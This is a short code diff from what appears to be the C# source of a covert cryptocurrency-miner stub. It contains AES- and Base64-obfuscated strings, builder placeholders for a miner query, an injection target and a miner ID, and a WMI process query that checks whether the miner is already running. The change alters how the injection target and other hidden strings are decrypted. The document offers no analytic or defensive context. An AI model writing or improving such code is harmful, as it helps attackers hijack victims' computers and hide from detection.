@@ -51,7 +51,7 @@ public partial class RProgram
             var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
             _rarg5_.Connect();
 
-            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String("#InjectionTarget")))))).Get();
+            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), _rGetString_("#InjectionTarget")))).Get();
             foreach (ManagementObject retObject in _rarg7_)
             {
                 if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
@@ -107,7 +107,7 @@ public partial class RProgram
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
     public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
